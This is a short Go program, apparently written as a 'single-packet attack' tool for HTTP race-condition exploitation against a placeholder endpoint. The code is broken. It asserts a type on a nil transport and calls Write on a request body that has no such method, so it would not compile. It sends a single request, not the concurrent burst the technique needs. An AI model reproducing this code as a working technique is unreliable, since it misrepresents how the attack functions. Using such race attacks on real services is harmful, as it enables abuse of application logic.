// Author: Olavo Borges
// https://www.linkedin.com/in/olavoborges/

package main

import (
	"bytes"
	"fmt"
	"net/http"
	"time"

	"golang.org/x/net/http2"
)

func main() {
	targetEndpoint := "https://example.com/target"
	requestData := []byte("Your request data here")

	err := singlePacketAttack(targetEndpoint, requestData)
	if err != nil {
		fmt.Println("Error:", err)
	}
}

func singlePacketAttack(targetEndpoint string, requestData []byte) error {
	// Create an HTTP/2 client
	client := &http.Client{}
	http2.ConfigureTransport(client.Transport.(*http.Transport))

	// Pre-send the bulk of each request
	req, err := http.NewRequest("POST", targetEndpoint, bytes.NewReader(requestData[:len(requestData)-1]))
	if err != nil {
		return err
	}

	// Send the request without the last byte
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Wait for a short duration
	time.Sleep(100 * time.Millisecond)

	// Send the withheld last byte
	_, err = req.Body.Write([]byte{requestData[len(requestData)-1]})
	if err != nil {
		return err
	}

	return nil
}
